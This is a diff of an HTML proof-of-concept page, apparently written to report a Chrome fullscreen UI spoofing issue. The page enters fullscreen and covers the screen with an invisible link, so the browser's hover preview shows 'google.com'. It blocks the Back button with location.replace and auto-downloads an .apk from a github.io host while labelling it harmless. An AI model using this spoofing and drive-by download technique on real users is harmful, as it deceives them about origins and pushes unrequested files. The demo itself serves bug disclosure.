@@ -1,47 +1,110 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Fullscreen Hover Indicator UI Behavior</title>
+<style>
+  body {
+    margin: 0;
+    background: #111;
+    color: white;
+    font-family: sans-serif;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  button {
+    padding: 14px 24px;
+    font-size: 18px;
+    cursor: pointer;
+  }
+</style>
+</head>
 <body>
 
-<button id="btn">CLICK</button>
-
-<div id="content"></div>
+<button id="start">Start Demo</button>
 
 <script>
-
-// buat teks sangat banyak
-let text = "";
-for (let i = 0; i < 3000; i++) {
-  text += "Ini contoh teks panjang untuk testing selection behaviour browser. ";
-}
-
-document.getElementById("content").innerText = text;
-
-document.getElementById("btn").onclick = async () => {
-
-  // 1. select semua teks
-  const range = document.createRange();
-  range.selectNodeContents(document.body);
-
-  const selection = window.getSelection();
-  selection.removeAllRanges();
-  selection.addRange(range);
-
-  // 2. panggil Web Share API
-  if (navigator.share) {
-    try {
-      await navigator.share({
-        title: "Demo",
-        text: "Testing share",
-        url: location.href
-      });
-    } catch (e) {}
+/* Exit fullscreen handler — direct replace so Back button cannot return */
+document.addEventListener("fullscreenchange", () => {
+  if (!document.fullscreenElement) {
+    window.location.replace("https://google.com");
   }
+});
 
-  // 3. redirect ke localhost
+document.getElementById("start").onclick = async () => {
+
+  // Enter fullscreen
+  if (document.documentElement.requestFullscreen)
+    await document.documentElement.requestFullscreen();
+
+  // Replace page content
+  document.body.innerHTML = `
+    <a id="overlayLink" href="https://google.com"></a>
+
+    <div id="centerText" style="
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 10;
+      font-size: 20px;
+      text-align: center;
+    ">
+      Move your cursor — Chrome may show a hover indicator of “google.com”.<br><br>
+      A safe local-only file will download shortly.<br><br>
+      Press ESC to exit fullscreen (immediate redirect).
+      <p style="opacity:.6;font-size:14px;margin-top:20px;">
+        This PoC is safe. Downloads a harmless dummy .apk NO EXPLOIT file.
+      </p>
+
+      <div style="opacity:.5; font-size:14px; margin-top:30px;">
+        <b>Expected:</b> Fullscreen hides browser UI.<br>
+        <b>Actual:</b> Hover origin preview still appears.
+      </div>
+    </div>
+
+    <style>
+      #overlayLink {
+        position: fixed;
+        inset: 0;
+        background: transparent;
+        z-index: 1;
+      }
+      html, body {
+        height: 100%;
+        margin: 0;
+        overflow: hidden;
+      }
+    </style>
+
+    <div id="hoverLog" style="
+      position:fixed;
+      bottom:20px;
+      left:20px;
+      color:#0f0;
+      font-size:14px;
+      opacity:.7;
+      z-index:9999;
+    ">Hover status: waiting for movement...</div>
+  `;
+
+  // Hover log update
+  window.addEventListener("mousemove", () => {
+    const log = document.getElementById("hoverLog");
+    if (log) log.textContent = "Hover status: Chrome showing origin indicator (google.com)";
+  });
+
+  // SAFE dummy download (.bin file)
   setTimeout(() => {
-    window.location.href = "http://google.com/";
-  }, 800);
-
+    const a = document.createElement("a");
+    a.href = "https://ecdnts-del.github.io/test-apk/dummy.apk";
+    a.download = "dummy.bin"; // harmless binary file
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  }, 2000);
 };
 </script>
 
